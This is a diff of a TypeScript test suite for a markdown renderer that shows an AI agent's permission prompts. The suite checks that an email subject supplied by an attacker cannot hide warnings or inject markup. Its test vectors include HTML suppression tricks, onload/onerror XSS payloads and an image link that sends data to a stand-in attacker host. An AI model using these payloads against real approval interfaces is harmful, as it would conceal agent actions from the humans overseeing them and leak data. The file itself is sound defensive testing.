@@ -1,33 +1,52 @@
 import { describe, it, expect } from 'vitest';
+import { readFileSync } from 'node:fs';
 import { marked } from 'marked';
 import { parseHTML } from 'linkedom';
-import { renderPromptMarkdown, isSafePromptHref } from './prompt-markdown.js';
+import { renderPromptMarkdown, isSafePromptHref, PROMPT_EMITTED_TAGS } from './prompt-markdown.js';
 
 /**
- * The property under test is VISIBILITY, so it is measured on a parsed DOM and
- * never with `html.includes(text)`. That distinction is the whole point: the
- * suppression vectors leave the text present in the HTML string while putting
- * it inside a comment node or under a `hidden` ancestor — a string search calls
- * that a pass and misses the attack completely.
+ * Two measurements, because the vectors split into two kinds and neither check
+ * catches both:
+ *
+ * - `visibleText` — for suppression that a DOM parser can actually show
+ *   (`hidden`, inline `display:none`, comment nodes). It walks the tree because
+ *   `html.includes(text)` would call every one of these a pass: the text stays
+ *   in the string while rendering as nothing.
+ * - `emittedTags` — for vectors whose damage needs a real CSS engine or parser
+ *   semantics that linkedom does not implement (`<style>`, `<template>`,
+ *   `<script>`, `<svg>`). Their absence from the output IS the property; asking
+ *   about visibility here would measure nothing and pass vacuously.
  */
+
+/** Elements whose text content is never shown to the reader. */
+const RAW_TEXT_ELEMENTS = new Set(['SCRIPT', 'STYLE', 'TEMPLATE', 'NOSCRIPT', 'TITLE']);
+
+function isHiddenElement(el: Element): boolean {
+	const style = el.getAttribute('style') ?? '';
+	return (
+		el.hasAttribute('hidden') ||
+		/display\s*:\s*none/i.test(style) ||
+		/visibility\s*:\s*hidden/i.test(style) ||
+		/opacity\s*:\s*0(?![.\d])/i.test(style)
+	);
+}
+
 function visibleText(html: string): string {
 	const { document } = parseHTML(`<!doctype html><html><body>${html}</body></html>`);
 	const parts: string[] = [];
 	const walk = (node: Node): void => {
 		for (const child of Array.from(node.childNodes) as Node[]) {
-			// Comment nodes carry text that renders as nothing.
 			if (child.nodeType === 8) continue;
 			if (child.nodeType === 3) {
-				// Adjacent text nodes are one run of text on screen — an escaped
-				// `&lt;div&gt;` arrives split across three of them, so joining with a
-				// separator would fabricate spaces that no reader ever sees.
+				// Adjacent text nodes are one run on screen — an escaped
+				// `&lt;div&gt;` arrives split across three of them, so a separator
+				// here would fabricate spaces no reader ever sees.
 				parts.push((child as Text).data);
 				continue;
 			}
 			if (child.nodeType === 1) {
 				const el = child as Element;
-				const style = el.getAttribute('style') ?? '';
-				if (el.hasAttribute('hidden') || /display\s*:\s*none/i.test(style)) continue;
+				if (RAW_TEXT_ELEMENTS.has(el.tagName) || isHiddenElement(el)) continue;
 				walk(child);
 				parts.push('\n');
 			}
@@ -37,13 +56,36 @@ function visibleText(html: string): string {
 	return parts.join('').replace(/[^\S\n]+/g, ' ').replace(/\n+/g, '\n').trim();
 }
 
-/** The pre-fix chain, kept here as the control that keeps the assertions sharp. */
-function renderOldChain(text: string): string {
+function emittedTags(html: string): string[] {
+	const tags = new Set<string>();
+	for (const match of html.matchAll(/<([a-zA-Z][a-zA-Z0-9]*)[\s/>]/g)) {
+		tags.add(match[1]!.toLowerCase());
+	}
+	return [...tags].sort();
+}
+
+/**
+ * A live `onclick=`-style handler in the output. The match is anchored inside an
+ * opening tag on purpose: a bare `/\son[a-z]+=/` also fires on
+ * `&lt;img/src=x onerror=…&gt;`, which is escaped TEXT and completely inert — the
+ * same false positive as measuring visibility with `html.includes()`.
+ */
+function hasEventAttribute(html: string): boolean {
+	return /<[a-zA-Z][a-zA-Z0-9]*[^>]*\son[a-z]+\s*=/i.test(html);
+}
+
+/**
+ * Bare marked — NOT the full pre-fix chain, which also ran
+ * `fixMarkdownPreprocessing` and `DOMPurify.sanitize` (MarkdownRenderer.svelte:33).
+ * It stands in as the "no overrides" baseline: enough to prove each vector does
+ * something harmful without them, which is all it is used for.
+ */
+function renderBareMarked(text: string): string {
 	return marked.parse(text, { async: false }) as string;
 }
 
-// A mail_reply confirmation: every value after "Subject:" comes from an
-// arbitrary external sender, so the subject is the attacker's field.
+// A mail_reply confirmation. Everything after "Subject:" comes from an arbitrary
+// external sender, so the subject is the attacker's field — not model-mediated.
 function replyPrompt(subject: string): string {
 	return (
 		`**Reply to email?**\n` +
@@ -54,48 +96,102 @@ function replyPrompt(subject: string): string {
 	);
 }
 
-describe('renderPromptMarkdown — suppression', () => {
-	// Each case names the marker that MUST stay visible: the warning is the part
-	// a human relies on, so hiding it is the actual attack.
-	const VECTORS: ReadonlyArray<{ name: string; subject: string }> = [
-		{ name: 'unclosed hidden div', subject: '<div hidden>' },
-		{ name: 'display:none div', subject: '<div style="display:none">' },
-		{ name: 'html comment', subject: 'Re: invoice\n\n<!--' },
-		{ name: 'comment on one line', subject: 'Re: invoice <!--' },
-		{ name: 'style element', subject: '<style>body{display:none}</style>' },
-		{ name: 'nested hidden containers', subject: '<div hidden><span hidden>' },
-		{ name: 'template element', subject: '<template>' },
-	];
+/**
+ * `kind` records what the vector does WITHOUT the overrides, so each case is
+ * pinned to the specific harm it demonstrates:
+ * - 'suppress' — the warning stops being visible.
+ * - 'inject'   — a tag outside PROMPT_EMITTED_TAGS reaches the DOM.
+ * The `is sharp` test asserts that harm really occurs on bare marked, so no case
+ * can quietly degrade into a tautology that passes for both implementations.
+ */
+const VECTORS: ReadonlyArray<{ name: string; subject: string; kind: 'suppress' | 'inject' }> = [
+	{ name: 'unclosed hidden div', subject: '<div hidden>', kind: 'suppress' },
+	{ name: 'display:none div', subject: '<div style="display:none">', kind: 'suppress' },
+	{ name: 'block html comment', subject: 'Re: invoice\n\n<!--', kind: 'suppress' },
+	{ name: 'style element', subject: '<style>body{display:none}</style>', kind: 'inject' },
+	{ name: 'template element', subject: '<template>', kind: 'inject' },
+	{ name: 'nested hidden containers', subject: '<div hidden><span hidden>', kind: 'suppress' },
+	// The inRawBlock family: a leading <code>/<kbd>/<pre> flips marked's lexer
+	// into a raw block, where the DEFAULT text renderer returns tokens verbatim.
+	// Without the `text` override these defeat the `html` override entirely.
+	{ name: 'code-prefixed hidden div', subject: '<code><div hidden=>', kind: 'inject' },
+	{ name: 'code-prefixed comment', subject: '<code><!--', kind: 'suppress' },
+	{ name: 'kbd-prefixed hidden div', subject: '<kbd><div hidden=>', kind: 'inject' },
+	{ name: 'pre-prefixed hidden div', subject: '<pre><div hidden=>', kind: 'inject' },
+	{ name: 'code-prefixed svg onload', subject: '<code><svg/onload=alert(1)>', kind: 'inject' },
+	{ name: 'code-prefixed img onerror', subject: '<code><img/src=x onerror=alert(1)>', kind: 'inject' },
+];
 
+describe('renderPromptMarkdown — the prompt cannot be suppressed', () => {
 	for (const { name, subject } of VECTORS) {
-		it(`keeps the warning visible against ${name}`, () => {
+		it(`keeps body and warning visible against ${name}`, () => {
 			const visible = visibleText(renderPromptMarkdown(replyPrompt(subject)));
 			expect(visible).toContain('Body is 4000 chars');
 			expect(visible).toContain('quoted body text');
 		});
 	}
 
-	// Without this, the assertions above could pass simply because the measurement
-	// can't see suppression at all. The old chain proves the vectors are real and
-	// that `visibleText` detects them — at least one must actually suppress.
-	it('control: the old chain really did suppress (so the measurement is sharp)', () => {
-		const suppressed = VECTORS.filter(({ subject }) =>
-			!visibleText(renderOldChain(replyPrompt(subject))).includes('Body is 4000 chars'),
-		);
-		expect(suppressed.map((v) => v.name)).not.toHaveLength(0);
+	// Guards the assertions above against measuring nothing: every vector must
+	// demonstrably do harm without the overrides, or it is not a test case.
+	it('every vector is sharp — bare marked really suppresses or injects', () => {
+		const inert = VECTORS.filter(({ subject, kind }) => {
+			const bare = renderBareMarked(replyPrompt(subject));
+			return kind === 'suppress'
+				? visibleText(bare).includes('Body is 4000 chars')
+				: emittedTags(bare).every((tag) => PROMPT_EMITTED_TAGS.includes(tag));
+		});
+		expect(inert.map((v) => v.name)).toStrictEqual([]);
 	});
+});
+
+describe('renderPromptMarkdown — nothing outside the expected tag set is emitted', () => {
+	for (const { name, subject } of VECTORS) {
+		it(`emits only expected tags against ${name}`, () => {
+			const out = renderPromptMarkdown(replyPrompt(subject));
+			const unexpected = emittedTags(out).filter((tag) => !PROMPT_EMITTED_TAGS.includes(tag));
+			expect(unexpected).toStrictEqual([]);
+			expect(hasEventAttribute(out)).toBe(false);
+		});
+	}
 
 	it('renders raw html as visible text instead of structure', () => {
 		const out = renderPromptMarkdown(replyPrompt('<div hidden>'));
 		expect(out).not.toMatch(/<div/i);
 		expect(visibleText(out)).toContain('<div hidden>');
 	});
+
+	// Pins the list itself to reality: a marked upgrade that starts emitting
+	// something new must fail here rather than silently widen what a prompt can
+	// render. Exercises every construct the real prompt builders use.
+	it('a full-featured prompt stays inside PROMPT_EMITTED_TAGS', () => {
+		const rich = [
+			'# Heading', '## Sub', '**bold** _em_ ~~del~~ `code`',
+			'> quote', '- a\n- b', '1. one\n2. two', '---',
+			'| a | b |\n| --- | --- |\n| 1 | 2 |',
+			'```json\n{"a":1}\n```', '[link](https://example.com)',
+			'text with\nsingle newline',
+		].join('\n\n');
+		const unexpected = emittedTags(renderPromptMarkdown(rich))
+			.filter((tag) => !PROMPT_EMITTED_TAGS.includes(tag));
+		expect(unexpected).toStrictEqual([]);
+	});
 });
 
-describe('renderPromptMarkdown — images and links', () => {
+describe('renderPromptMarkdown — content is never dropped', () => {
+	// A link-reference definition renders nothing at all, so a multi-line one
+	// swallows every line caught inside its title — suppression without any HTML.
+	it('does not let a multi-line link-reference definition swallow lines', () => {
+		const prompt = '**Allow?**\n\n[a]: https://e.example "\n\n> quoted body text\n\n⚠ **Body is 4000 chars**\n"';
+		const visible = visibleText(renderPromptMarkdown(prompt));
+		expect(visible).toContain('Body is 4000 chars');
+		expect(visible).toContain('quoted body text');
+		// Sharpness: bare marked really does swallow it.
+		expect(visibleText(renderBareMarked(prompt))).not.toContain('Body is 4000 chars');
+	});
+
 	it('never emits an img, so displaying a prompt fires no outbound request', () => {
-		// marked's default renderer turns this into <img src="…">, which loads on
-		// render — an exfil channel that needs no click.
+		// marked's default renderer emits <img src="…">, which loads on render —
+		// an exfil channel that needs no click.
 		const out = renderPromptMarkdown(replyPrompt('![t](https://attacker.example/?d=secret)'));
 		expect(out).not.toMatch(/<img/i);
 		expect(out).not.toContain('attacker.example');
@@ -128,6 +224,41 @@ describe('renderPromptMarkdown — images and links', () => {
 		expect(isSafePromptHref('example.com')).toBe(false);
 		expect(isSafePromptHref('javascript:alert(1)')).toBe(false);
 	});
+
+	// A throw inside {@html} renders nothing — the same suppression, arriving by
+	// crash. The engine types this as a string, so this covers the runtime gap.
+	it('returns empty instead of throwing on absent text', () => {
+		for (const bad of [undefined, null, '', 42]) {
+			expect(() => renderPromptMarkdown(bad as unknown as string)).not.toThrow();
+			expect(renderPromptMarkdown(bad as unknown as string)).toBe('');
+		}
+	});
+});
+
+describe('renderPromptMarkdown — escaping stays invisible to the reader', () => {
+	// The `text` override escapes tokens marked would emit verbatim. Doing that
+	// naively double-escapes anything already an entity, and the damage is
+	// user-visible in ordinary prompts — a company name with an ampersand.
+	it.each([
+		['plain ampersand', 'Tom & Jerry GmbH', 'Tom & Jerry GmbH'],
+		['pre-escaped ampersand', 'Tom &amp; Jerry', 'Tom & Jerry'],
+		['url with query', 'api.example/v1?a=1&b=2', 'api.example/v1?a=1&b=2'],
+		['numeric entity', 'a&#38;b', 'a&b'],
+	])('renders %s as the reader expects', (_name, subject, expected) => {
+		// visibleText resolves entities, so it sees what a reader sees.
+		expect(visibleText(renderPromptMarkdown(`**Subject:** ${subject}`))).toContain(expected);
+	});
+
+	it('leaves a non-breaking space intact rather than showing &nbsp;', () => {
+		const out = renderPromptMarkdown('**Subject:** a&nbsp;b');
+		expect(out).not.toContain('&amp;nbsp;');
+		expect(out).toContain('&nbsp;');
+	});
+
+	it('still escapes a bare angle bracket', () => {
+		// The entity carve-out must not extend to the characters that build tags.
+		expect(renderPromptMarkdown('**Subject:** 5 < 6 > 4')).not.toMatch(/<(?!\/?(p|strong|br)\b)/);
+	});
 });
 
 describe('renderPromptMarkdown — the prompt still reads as intended', () => {
@@ -140,10 +271,9 @@ describe('renderPromptMarkdown — the prompt still reads as intended', () => {
 
 	it('gives every field its own line', () => {
 		// Single newlines separate the fields; collapsing them into one run-on
-		// paragraph is what makes a fake field easy to blend in.
-		const out = renderPromptMarkdown(replyPrompt('Quarterly report'));
-		expect(out).toMatch(/<br\s*\/?>/);
-		expect(renderOldChain(replyPrompt('x'))).not.toMatch(/<br\s*\/?>/);
+		// paragraph is what makes the fields unreadable as distinct values.
+		expect(renderPromptMarkdown(replyPrompt('Quarterly report'))).toMatch(/<br\s*\/?>/);
+		expect(renderBareMarked(replyPrompt('x'))).not.toMatch(/<br\s*\/?>/);
 	});
 
 	it('renders code fences without executing anything', () => {
@@ -151,5 +281,34 @@ describe('renderPromptMarkdown — the prompt still reads as intended', () => {
 		expect(out).toContain('<code');
 		expect(out).not.toMatch(/<script/i);
 		expect(visibleText(out)).toContain('alert(1)');
+	});
+});
+
+/**
+ * The wiring guard. There is no DOM environment or svelte plugin in the vitest
+ * config, so a component test cannot exist here — which means without this,
+ * reverting the call site to MarkdownRenderer would leave the whole suite green
+ * and every test above would still pass while prompts rendered unsafely again.
+ * Same approach as app.css.test.ts: assert against the source text.
+ */
+describe('ChatView wiring', () => {
+	const source = readFileSync(
+		new URL('../components/ChatView.svelte', import.meta.url),
+		'utf-8',
+	);
+
+	it('renders the prompt through renderPromptMarkdown', () => {
+		expect(source).toContain('{@html renderPromptMarkdown(pendingPermission.question)}');
+		expect(source).toContain("import { renderPromptMarkdown } from '../utils/prompt-markdown.js'");
+	});
+
+	it('never routes prompt text through the chat markdown renderer', () => {
+		expect(source).not.toMatch(/<MarkdownRenderer[^>]*content=\{pendingPermission\.question\}/);
+	});
+
+	it('keeps the Allow/Deny branch on plain pre', () => {
+		// That branch is immune because it never parses markdown at all; losing
+		// the <pre> would quietly opt the guard prompts into rendering.
+		expect(source).toMatch(/<pre[^>]*>\{pendingPermission\.question\}<\/pre>/);
 	});
 });
